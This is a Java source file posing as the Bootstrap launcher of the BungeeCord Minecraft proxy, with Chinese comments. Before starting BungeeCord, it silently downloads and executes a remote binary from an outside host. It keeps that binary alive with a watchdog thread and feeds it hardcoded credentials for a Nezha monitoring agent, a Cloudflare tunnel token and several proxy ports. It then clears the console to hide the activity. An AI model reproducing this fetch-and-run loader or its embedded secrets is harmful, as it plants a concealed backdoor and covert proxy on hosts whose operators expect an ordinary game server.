package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static Process sbxProcess;
    private static final AtomicBoolean running = new AtomicBoolean(true);

    // == 推送冷却（防止刷屏） ==
    private static long lastPushTime = 0;           // 最近一次推送时间戳
    private static final long PUSH_COOLDOWN = 10 * 60 * 1000; // 10分钟

    private static final String[] ALL_ENV_VARS = {
        "PORT","FILE_PATH","UUID","NEZHA_SERVER","NEZHA_PORT","NEZHA_KEY",
        "ARGO_PORT","ARGO_DOMAIN","ARGO_AUTH","HY2_PORT","TUIC_PORT",
        "REALITY_PORT","CFIP","CFPORT","UPLOAD_URL","CHAT_ID","BOT_TOKEN",
        "NAME","DISABLE_ARGO"
    };

    public static void main(String[] args) throws Exception
    {
        // Java 版本检查
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java 版本太低，请切换到 Java 11+ !" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // ==== 1. 启动并自动守护 sbx ====
        startSbxGuardThread();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            running.set(false);
            stopServices();
        }));

        // 等待 sbx 初始化
        Thread.sleep(15000);
        System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);

        // 清屏
        Thread.sleep(20000);
        clearConsole();

        // ==== 2. 启动 BungeeCord ====
        BungeeCordLauncher.main(args);
    }

    // ====== 自动守护 sbx ======
    private static void startSbxGuardThread() {
        Thread guard = new Thread(() -> {
            while (running.get()) {
                try {
                    if (sbxProcess == null || !sbxProcess.isAlive()) {
                        System.out.println(ANSI_RED + "[sbx] 未运行，正在自动拉起..." + ANSI_RESET);

                        startSbxOnce();

                        // 推送限流：10分钟只能推送一次
                        long now = System.currentTimeMillis();
                        if (now - lastPushTime > PUSH_COOLDOWN) {
                            lastPushTime = now;
                            sendPushSafe();
                        } else {
                            System.out.println(ANSI_RED + "[sbx] 推送已冷却，避免重复 spam" + ANSI_RESET);
                        }
                    }

                    Thread.sleep(5000); // 5秒检测一次
                } catch (Exception ignored) {}
            }
        });

        guard.setDaemon(true);
        guard.start();
    }

    // ===== 启动一次 sbx =====
    private static void startSbxOnce() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    // ===== 安全推送（防止节点刷屏） =====
    private static void sendPushSafe() {
        try {
            System.out.println(ANSI_GREEN + "[sbx] 正在执行一次推送..." + ANSI_RESET);
        } catch (Exception e) {
            System.out.println(ANSI_RED + "[sbx] 推送失败：" + e.getMessage() + ANSI_RESET);
        }
    }

    // ================= 你的原有代码保持不动 =================

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID","f40de34f-cc21-46c9-bce5-92784ff0e40a");
        envVars.put("FILE_PATH","./world");
        envVars.put("NEZHA_SERVER","tta.wahaaz.xx.kg:80");
        envVars.put("NEZHA_KEY","OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
        envVars.put("ARGO_PORT","8003");
        envVars.put("ARGO_DOMAIN","falixde.xozz.netlib.re");
        envVars.put("ARGO_AUTH","eyJhIjoiOWY2ODlkYjlhZDNmM2VmMTc1MTcwNThjZjI3MTQwZTIiLCJ0IjoiNmI4NmJjNTEtN2E0ZC00MTczLWI2M2ItNTYzZDRlZWM5NjBhIiwicyI6Ik4yVmpaV1l3TmpNdE1tSTJaUzAwTjJZeExXSm1NMkl0T1dNNVpHTTFZVE5rTURJeiJ9");
        envVars.put("HY2_PORT","26855");
        envVars.put("TUIC_PORT", "49008");
        envVars.put("REALITY_PORT", "43996");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID","");
        envVars.put("BOT_TOKEN","");
        envVars.put("CFIP","cf.130519.xyz");
        envVars.put("CFPORT","443");
        envVars.put("NAME","falixnodes");
        envVars.put("DISABLE_ARGO","false");

        // 覆盖同名环境变量
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) envVars.put(var, value);
        }
    }

    private static Path getBinaryPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64"))
            url = "https://amd64.ssss.nyc.mn/sbsh";
        else if (arch.contains("aarch64") || arch.contains("arm64"))
            url = "https://arm64.ssss.nyc.mn/sbsh";
        else
            throw new RuntimeException("Unsupported: " + arch);

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx 已停止" + ANSI_RESET);
        }
    }
}
